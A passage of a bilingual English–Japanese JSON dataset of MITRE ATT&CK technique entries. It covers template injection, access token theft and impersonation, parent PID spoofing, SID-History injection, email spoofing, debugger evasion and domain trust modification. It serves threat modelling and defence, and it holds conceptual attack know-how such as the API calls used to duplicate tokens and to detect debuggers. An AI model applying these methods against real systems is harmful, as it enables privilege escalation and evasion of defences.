                "description_jp": "攻撃者は、ユーザー文書テンプレート内の参照を作成または変更して、悪意のあるコードを隠蔽したり、認証試行を強制したりする可能性があります。例えば、MicrosoftのOffice Open XML (OOXML) 仕様は、古いバイナリ形式 (.doc, .xls, .ppt) を置き換えるために、Office文書 (.docx, xlsx, .pptx) 用のXMLベースの形式を定義しています。OOXMLファイルは、さまざまなXMLファイル（パーツと呼ばれる）で構成されるZIPアーカイブにまとめられており、文書がどのようにレンダリングされるかをまとめて定義するプロパティを含んでいます。(引用: Microsoft Open XML July 2017)\n\nパーツ内のプロパティは、オンラインURLを介してアクセスされる共有パブリックリソースを参照する場合があります。例えば、テンプレートプロパティは、文書のロード時に取得される、事前にフォーマットされた文書の設計図として機能するファイルを参照する場合があります。\n\n敵対者は、これらのテンプレートを悪用して、ユーザー文書を介して実行される悪意のあるコードを最初に隠蔽する可能性があります。文書に注入されたテンプレート参照により、文書がロードされるときに悪意のあるペイロードを取得して実行できるようになる場合があります。(引用: SANS Brian Wiltse Template Injection) これらの文書は、[フィッシング](https://attack.mitre.org/techniques/T1566)や[汚染された共有コンテンツ](https://attack.mitre.org/techniques/T1080)などの他のテクニックを介して配信される可能性があり、悪意のあるペイロードが取得されるまで典型的なインジケータ（VBAマクロ、スクリプトなど）が存在しないため、静的検出を回避する可能性があります。(引用: Redxorblue Remote Template Injection) 実際には、テンプレートインジェクションがエクスプロイトを含む悪意のあるコードをロードするために使用された例が見られています。(引用: MalwareBytes Template Injection OCT 2017)\n\n敵対者はまた、.rtfファイル内の<code>*\\template</code>コントロールワードを変更して、同様に悪意のあるコードを隠蔽してからダウンロードする可能性があります。この正当なコントロールワード値は、.rtfファイルが開かれたときに取得されてロードされるテンプレートファイルリソースのファイル宛先であることを意図しています。しかし、敵対者は既存の.rtfファイルのバイトを変更して、悪意のあるペイロードのURLリソースを含むテンプレートコントロールワードフィールドを挿入する可能性があります。(引用: Proofpoint RTF Injection)(引用: Ciberseguridad Decoding malicious RTF files)\n\nこのテクニックはまた、SMB/HTTPS（または他の資格情報プロンプト）URLを注入し、認証試行をトリガーすることにより、[強制認証](https://attack.mitre.org/techniques/T1187)を可能にする場合もあります。(引用: Anomali Template Injection MAR 2018)(引用: Talos Template Injection July 2017)(引用: ryhanson phishery SEPT 2016)",
                "subtechniques": []
            },
            {
                "id": "T1134",
                "name_eng": "Access Token Manipulation",
                "name_jp": "アクセストークン操作",
                "description_eng": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
                "description_jp": "攻撃者は、アクションを実行しアクセス制御をバイパスするために、異なるユーザーまたはシステムのセキュリティコンテキストで動作するようにアクセストークンを変更する可能性があります。Windowsはアクセストークンを使用して、実行中のプロセスの所有権を決定します。ユーザーはアクセストークンを操作して、実行中のプロセスを別のプロセスのサブプロセスであるかのように見せかけたり、プロセスを開始したユーザー以外の誰かに属しているかのように見せかけたりすることができます。これが発生すると、プロセスは新しいトークンに関連付けられたセキュリティコンテキストも引き継ぎます。\n\n攻撃者は、組み込みのWindows API関数を使用して既存のプロセスからアクセストークンをコピーできます。これはトークン窃取として知られています。これらのトークンは、既存のプロセスに適用したり（つまり、[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)）、新しいプロセスを生成するために使用したり（つまり、[トークンを使用したプロセスの作成](https://attack.mitre.org/techniques/T1134/002)）できます。攻撃者は、トークンを盗むためには既に特権ユーザーコンテキスト（つまり管理者）である必要があります。ただし、攻撃者は一般的に、管理者レベルからSYSTEMレベルにセキュリティコンテキストを昇格させるためにトークン窃取を使用します。アカウントがリモートシステム上で適切な権限を持っている場合、攻撃者はトークンを使用してそのトークンのアカウントとしてリモートシステムに認証できます。(引用: Pentestlab Token Manipulation)\n\n標準ユーザーは誰でも、<code>runas</code>コマンドおよびWindows API関数を使用して偽装トークンを作成できます。管理者アカウントへのアクセスは必要ありません。Active Directoryフィールドなど、アクセストークンを変更するために使用できる他のメカニズムもあります。",
                "subtechniques": [
                    {
                        "id": "T1134.001",
                        "name_eng": "Token Impersonation/Theft",
                        "name_jp": "トークン偽装/窃取",
                        "description_eng": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",
                        "description_jp": "攻撃者は、権限を昇格させアクセス制御をバイパスするために、別のユーザーの既存のトークンを複製して偽装する可能性があります。例えば、攻撃者は`DuplicateToken`または`DuplicateTokenEx`を使用して既存のトークンを複製できます。(引用: DuplicateToken function) その後、トークンは`ImpersonateLoggedOnUser`と共に使用して呼び出しスレッドがログオンユーザーのセキュリティコンテキストを偽装できるようにするか、`SetThreadToken`と共に使用して偽装トークンをスレッドに割り当てることができます。\n\n攻撃者は、複製したトークンを割り当てたい特定の既存のプロセスがある場合に、[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)を実行する可能性があります。例えば、これはターゲットユーザーがシステム上で非ネットワークログオンセッションを持っている場合に役立つ可能性があります。\n\n攻撃者が既存のプロセスにアタッチするのではなく、複製したトークンを使用して新しいプロセスを作成する場合は、追加で`CreateProcessWithTokenW`または`CreateProcessAsUserW`を使用して[トークンを使用したプロセスの作成](https://attack.mitre.org/techniques/T1134/002)を行うことができます。[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)は、新しいトークンを作成するのではなく、既存のトークンを複製することを指すため、[トークンの作成と偽装](https://attack.mitre.org/techniques/T1134/003)とも区別されます。"
                    },
                    {
                        "id": "T1134.004",
                        "name_eng": "Parent PID Spoofing",
                        "name_jp": "親PIDスプーフィング",
                        "description_eng": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)",
                        "description_jp": "攻撃者は、プロセス監視防御を回避したり権限を昇格させたりするために、新しいプロセスの親プロセス識別子（PPID）を偽装する可能性があります。新しいプロセスは、明示的に指定されない限り、通常、その親プロセスまたは呼び出し元プロセスから直接生成されます。新しいプロセスのPPIDを明示的に割り当てる1つの方法は、使用するPPIDを定義するパラメータをサポートする<code>CreateProcess</code> API呼び出しを介することです。(引用: DidierStevens SelectMyParent Nov 2009) この機能は、要求された昇格プロセスが現在のユーザーコンテキストではなくSYSTEM（通常は<code>svchost.exe</code>または<code>consent.exe</code>を介して）によって生成された後、PPIDを正しく設定するために、ユーザーアカウント制御（UAC）などのWindows機能によって使用されます。(引用: Microsoft UAC Nov 2018)\n\n攻撃者はこれらのメカニズムを悪用して、Officeドキュメントから直接生成されるプロセスをブロックするものなどの防御を回避したり、[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001)の一部として配信されたOfficeドキュメントではなく<code>explorer.exe</code>であるかのように[PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011)のPPIDを偽装するなど、異常な/潜在的に悪意のある親子プロセス関係をターゲットとする分析を回避したりする可能性があります。(引用: CounterCept PPID Spoofing Dec 2018) この偽装は、悪意のあるOfficeドキュメント内の[Visual Basic](https://attack.mitre.org/techniques/T1059/005)または[ネイティブAPI](https://attack.mitre.org/techniques/T1106)を実行できる任意のコードを介して実行される可能性があります。(引用: CTD PPID Spoofing Macro Mar 2019)(引用: CounterCept PPID Spoofing Dec 2018)\n\nPPIDを明示的に割り当てることは、親プロセスへの適切なアクセス権があれば、昇格された権限を有効にすることもできます。例えば、特権ユーザーコンテキスト（つまり管理者）の攻撃者は、新しいプロセスを生成し、親をSYSTEMとして実行されているプロセス（<code>lsass.exe</code>など）として割り当てることで、継承されたアクセストークンを介して新しいプロセスを昇格させることができます。(引用: XPNSec PPID Nov 2017)"
                    },
                    {
                        "id": "T1134.005",
                        "name_eng": "SID-History Injection",
                        "name_jp": "SID履歴インジェクション",
                        "description_eng": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).",
                        "description_jp": "攻撃者はSID履歴インジェクションを使用して権限を昇格させ、アクセス制御をバイパスする可能性があります。Windowsセキュリティ識別子（SID）は、ユーザーまたはグループアカウントを識別する一意の値です。SIDは、セキュリティ記述子とアクセストークンの両方でWindowsセキュリティによって使用されます。(引用: Microsoft SID) アカウントは、SID履歴Active Directory属性に追加のSIDを保持でき(引用: Microsoft SID-History Attribute)、ドメイン間の相互運用可能なアカウント移行を可能にします（例：SID履歴のすべての値がアクセストークンに含まれます）。\n\nドメイン管理者（または同等の）権限があれば、収集されたまたはよく知られているSID値（引用: Microsoft Well Known SIDs Jun 2017）をSID履歴に挿入して、エンタープライズ管理者などの任意のユーザー/グループの偽装を有効にすることができます。この操作により、ローカルリソースへの昇格されたアクセスや、[リモートサービス](https://attack.mitre.org/techniques/T1021)、[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)、または[Windowsリモート管理](https://attack.mitre.org/techniques/T1021/006)などの横方向の移動テクニックを介した、それ以外ではアクセスできないドメインへのアクセスが可能になる場合があります。"
                    },
                    {
                        "id": "T1134.002",
                        "name_eng": "Create Process with Token",
                        "name_jp": "トークンを使用したプロセスの作成",
                        "description_eng": "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)\n\nCreating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.\n\nWhile this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",
                        "description_jp": "攻撃者は、既存のトークンを使用して新しいプロセスを作成し、権限を昇格させアクセス制御をバイパスする可能性があります。プロセスは、<code>CreateProcessWithTokenW</code>や<code>runas</code>などの機能を使用して、別のユーザーのトークンと結果のセキュリティコンテキストで作成できます。(引用: Microsoft RunAs)\n\n現在のユーザーに関連付けられていないトークンを使用してプロセスを作成するには、ターゲットユーザーの資格情報、そのユーザーを偽装するための特定の権限、または使用するトークンへのアクセスが必要になる場合があります。例えば、トークンは[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)によって複製されたり、[トークンの作成と偽装](https://attack.mitre.org/techniques/T1134/003)によって作成されたりしてから、プロセスを作成するために使用されることがあります。\n\nこのテクニックは[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)とは異なりますが、トークンが複製されてから新しいプロセスの作成に使用される場合には、これらのテクニックを組み合わせて使用できます。"
                    },
                    {
                        "id": "T1134.003",
                        "name_eng": "Make and Impersonate Token",
                        "name_jp": "トークンの作成と偽装",
                        "description_eng": "Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function.(Citation: LogonUserW function) The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.\n\nThis behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.",
                        "description_jp": "攻撃者は新しいトークンを作成し、ユーザーを偽装して権限を昇格させ、アクセス制御をバイパスする可能性があります。例えば、攻撃者がユーザー名とパスワードを持っているが、ユーザーがシステムにログオンしていない場合、攻撃者は`LogonUser`関数を使用してユーザーのログオンセッションを作成できます。(引用: LogonUserW function) この関数は新しいセッションのアクセストークンのコピーを返し、攻撃者は`SetThreadToken`を使用してトークンをスレッドに割り当てることができます。\n\nこの動作は、既存のトークンを盗んだり複製したりするのではなく、新しいユーザートークンを作成することを指すため、[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)とは異なります。"
                    }
                ]
            },
            {
                "id": "T1672",
                "name_eng": "Email Spoofing",
                "name_jp": "メールスプーフィング",
                "description_eng": "Adversaries may fake, or spoof, a sender’s identity by modifying the value of relevant email headers in order to establish contact with victims under false pretenses.(Citation: Proofpoint TA427 April 2024) In addition to actual email content, email headers (such as the FROM header, which contains the email address of the sender) may also be modified. Email clients display these headers when emails appear in a victim's inbox, which may cause modified emails to appear as if they were from the spoofed entity. \n\nThis behavior may succeed when the spoofed entity either does not enable or enforce identity authentication tools such as Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and/or Domain-based Message Authentication, Reporting and Conformance (DMARC).(Citation: Cloudflare DMARC, DKIM, and SPF)(Citation: DMARC-overview)(Citation: Proofpoint-DMARC) Even if SPF and DKIM are configured properly, spoofing may still succeed when a domain sets a weak DMARC policy such as `v=DMARC1; p=none; fo=1;`. This means that while DMARC is technically present, email servers are not instructed to take any filtering action when emails fail authentication checks.(Citation: Proofpoint TA427 April 2024)(Citation: ic3-dprk)\n\nAdversaries may abuse absent or weakly configured SPF, SKIM, and/or DMARC policies to conceal social engineering attempts(Citation: ic3-dprk) such as [Phishing](https://attack.mitre.org/techniques/T1566). They may also leverage email spoofing for [Impersonation](https://attack.mitre.org/techniques/T1656) of legitimate external individuals and organizations, such as journalists and academics.(Citation: ic3-dprk)",
                "description_jp": "攻撃者は、偽の口実で被害者と接触を確立するために、関連するメールヘッダーの値を変更することにより、送信者のIDを偽装、つまりスプーフィングする可能性があります。(引用: Proofpoint TA427 April 2024) 実際のメールコンテンツに加えて、メールヘッダー（送信者のメールアドレスを含むFROMヘッダーなど）も変更される可能性があります。メールクライアントは、メールが被害者の受信トレイに表示されるときにこれらのヘッダーを表示するため、変更されたメールはスプーフィングされたエンティティからのものであるかのように見える可能性があります。\n\nこの動作は、スプーフィングされたエンティティがSender Policy Framework (SPF)、DomainKeys Identified Mail (DKIM)、および/またはDomain-based Message Authentication, Reporting and Conformance (DMARC)などのID認証ツールを有効にしていないか、強制していない場合に成功する可能性があります。(引用: Cloudflare DMARC, DKIM, and SPF)(引用: DMARC-overview)(引用: Proofpoint-DMARC) SPFとDKIMが適切に構成されていても、ドメインが`v=DMARC1; p=none; fo=1;`などの弱いDMARCポリシーを設定している場合、スプーフィングは依然として成功する可能性があります。これは、DMARCが技術的に存在していても、メールサーバーが認証チェックに失敗したメールに対してフィルタリングアクションを実行するように指示されていないことを意味します。(引用: Proofpoint TA427 April 2024)(引用: ic3-dprk)\n\n攻撃者は、不在または弱く構成されたSPF、DKIM、および/またはDMARCポリシーを悪用して、[フィッシング](https://attack.mitre.org/techniques/T1566)などのソーシャルエンジニアリングの試みを隠蔽する可能性があります。(引用: ic3-dprk) また、ジャーナリストや学者など、正当な外部の個人や組織の[なりすまし](https://attack.mitre.org/techniques/T1656)のためにメールスプーフィングを利用する可能性もあります。(引用: ic3-dprk)",
                "subtechniques": []
            },
            {
                "id": "T1622",
                "name_eng": "Debugger Evasion",
                "name_jp": "デバッガ回避",
                "description_eng": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)\n\nDebugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.\n\nSpecific checks will vary based on the target and/or adversary. On Windows, this may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). On Linux, this may involve querying `/proc/self/status` for the `TracerPID` field, which indicates whether or not the process is being traced by dynamic analysis tools.(Citation: Cado Security P2PInfect 2023)(Citation: Positive Technologies Hellhounds 2023) Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)\n\nMalware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the program’s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the program’s execution to continue.(Citation: Apriorit)\n\nAdversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>OutputDebugStringW()</code>.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)",
                "description_jp": "攻撃者は、デバッガを検出して回避するためにさまざまな手段を用いる可能性があります。デバッガは通常、防御側が潜在的なマルウェアペイロードの実行をトレースおよび/または分析するために使用します。(引用: ProcessHacker Github)\n\nデバッガ回避には、デバッグ環境を示すアーティファクトの存在のチェック結果に基づいて動作を変更することが含まれる場合があります。[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)と同様に、攻撃者がデバッガを検出した場合、マルウェアを変更して被害者から切り離したり、インプラントのコア機能を隠したりする可能性があります。また、セカンダリペイロードまたは追加ペイロードをドロップする前にデバッガアーティファクトを検索することもあります。\n\n特定のチェックは、ターゲットおよび/または敵対者によって異なります。Windowsでは、これには<code>IsDebuggerPresent()</code>や<code>NtQueryInformationProcess()</code>などの[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数呼び出し、またはプロセス環境ブロック（PEB）の<code>BeingDebugged</code>フラグの手動チェックが含まれる場合があります。Linuxでは、これには`/proc/self/status`の<code>TracerPID</code>フィールドのクエリが含まれる場合があり、これはプロセスが動的分析ツールによってトレースされているかどうかを示します。(引用: Cado Security P2PInfect 2023)(引用: Positive Technologies Hellhounds 2023) デバッグアーティファクトの他のチェックでは、ハードウェアブレークポイント、割り込みアセンブリオペコード、時間チェック、または現在のプロセスで例外が発生した場合の測定（存在するデバッガーが潜在的なエラーを「飲み込む」または処理すると仮定）を列挙しようとする場合もあります。(引用: hasherezade debug)(引用: AlKhaser Debug)(引用: vxunderground debug)\n\nマルウェアはまた、構造化例外処理（SEH）を利用して、例外をスローし、プロセスが中断されているかどうかを検出することにより、デバッガーを検出する可能性があります。SEHはハードウェアとソフトウェアの両方の期待値を処理し、デバッグのサポートを含む例外の制御を提供します。デバッガーが存在する場合、プログラムの制御はデバッガーに移り、コードの実行は中断されます。デバッガーが存在しない場合、制御はSEHハンドラーに移り、例外を自動的に処理してプログラムの実行を継続させます。(引用: Apriorit)\n\n攻撃者は、これらのデバッガチェックから学習した情報を自動検出中に使用して、その後の動作を形成する可能性があります。デバッガはまた、プロセスを切り離したり、<code>OutputDebugStringW()</code>などの[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数呼び出しをループさせることによって生成されるメッセージを介してデバッグログを無意味なデータであふれさせたりすることによって回避できます。(引用: wardle evilquest partii)(引用: Checkpoint Dridex Jan 2021)",
                "subtechniques": []
            },
            {
                "id": "T1484",
                "name_eng": "Domain or Tenant Policy Modification",
                "name_jp": "ドメインまたはテナントポリシーの変更",
                "description_eng": "Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.\n\nModifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.\n\nWith sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:  \n\n* modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)\n* modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)\n* changing configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).\n* adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant (Citation: Okta Cross-Tenant Impersonation 2023)\n\nAdversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",
                "description_jp": "攻撃者は、ドメインまたはIDテナントの構成設定を変更して、一元管理された環境で防御を回避したり権限を昇格させたりする可能性があります。このようなサービスは、デバイスやアカウントなどのIDリソースを管理するための一元的な手段を提供し、多くの場合、信頼関係、ID同期、IDフェデレーションなど、ドメイン間またはテナント間に適用される可能性のある構成設定を含みます。\n\nドメインまたはテナント設定の変更には、Microsoft Active Directory (AD)のドメイングループポリシーオブジェクト(GPO)の変更や、ドメインまたはテナント間のフェデレーショントラスト関係を含むドメインのトラスト設定の変更が含まれる場合があります。\n\n十分な権限があれば、攻撃者はドメインまたはテナントポリシー設定を変更できます。これらのサービスの構成設定は多数のIDリソースに適用されるため、この悪用から生じる可能性のある潜在的な攻撃の悪意のある結果は多数あります。このような悪用の例としては、次のようなものがあります：\n\n* ドメイン環境全体のコンピュータに悪意のある[スケジュールタスク](https://attack.mitre.org/techniques/T1053/005)をプッシュするためのGPOの変更(引用: ADSecurity GPO Persistence 2016)(引用: Wald0 Guide to GPOs)(引用: Harmj0y Abusing GPO Permissions)\n* 攻撃者が制御するドメインを含めるためのドメイン信頼関係の変更。これにより、攻撃者は被害者ドメインリソースによって後で受け入れられるアクセストークンを偽造できるようになります(引用: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)\n* [不正なドメインコントローラー](https://attack.mitre.org/techniques/T1207)を実装するためのAD環境内の構成設定の変更。\n* 新しい、攻撃者が制御するフェデレーションIDプロバイダーをIDテナントに追加し、攻撃者が被害者テナントによって管理されている任意のユーザーとして認証できるようにします。(引用: Okta Cross-Tenant Impersonation 2023)\n\n攻撃者は、ドメインまたはテナントポリシーを一時的に変更し、悪意のあるアクションを実行した後、変更を元に戻して疑わしいインジケータを削除する可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1484.002",
                        "name_eng": "Trust Modification",
                        "name_jp": "信頼関係の変更",
                        "description_eng": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002) without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) \n\nAn adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant.(Citation: Okta Cross-Tenant Impersonation 2023) This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.(Citation: AWS RE:Inforce Threat Detection 2024)",
                        "description_jp": "攻撃者は、新しいドメイン信頼を追加したり、既存のドメイン信頼のプロパティを変更したり、あるいはドメインとテナント間の信頼関係の構成をその他の方法で変更して、防御を回避したり権限を昇格させたりする可能性があります。ユーザーIDがフェデレーションされているかどうかなどの信頼の詳細は、共有リソースへのアクセスの目的でドメイン間またはテナント間に認証および承認プロパティを適用できるようにします。(引用: Microsoft - Azure AD Federation) これらの信頼オブジェクトには、アカウント、資格情報、およびサーバー、トークン、ドメインに適用されるその他の認証マテリアルが含まれる場合があります。\n\nこれらの信頼関係を操作することにより、攻撃者は、制御するオブジェクトを追加するように設定を変更することで、権限を昇格させたり防御を回避したりできる可能性があります。例えば、Microsoft Active Directory (AD) 環境では、署名証明書を侵害して新しい資格情報を偽造する必要なく、[SAMLトークン](https://attack.mitre.org/techniques/T1606/002)を偽造するためにこれを使用できます。代わりに、攻撃者はドメイン信頼関係を操作して独自の署名証明書を追加できます。攻撃者はまた、Active Directory Federation Services (AD FS) を使用してADドメインをフェデレーションドメインに変換することもでき、これにより、指定されたユーザーとして任意の有効な資格情報セットでログインするためのクレーム発行規則の変更など、悪意のある信頼関係の変更が可能になる場合があります。(引用: AADInternals zure AD Federated Domain)\n\n攻撃者はまた、OktaやAWS IAM Identity CenterなどのIDテナントに新しいフェデレーションIDプロバイダーを追加する可能性があり、これにより攻撃者はテナントの任意のユーザーとして認証できるようになる可能性があります。(引用: Okta Cross-Tenant Impersonation 2023) これにより、脅威アクターはIDテナントを利用するさまざまなクラウドベースのサービスへの広範なアクセスを取得できる可能性があります。例えば、AWS環境では、AWS組織の新しいIDプロバイダーを作成する攻撃者は、各メンバーアカウントのIDを作成することなく、すべてのAWS組織メンバーアカウントにフェデレーションできるようになります。(引用: AWS RE:Inforce Threat Detection 2024)"
                    },
                    {
                        "id": "T1484.001",
                        "name_eng": "Group Policy Modification",
                        "name_jp": "グループポリシーの変更",
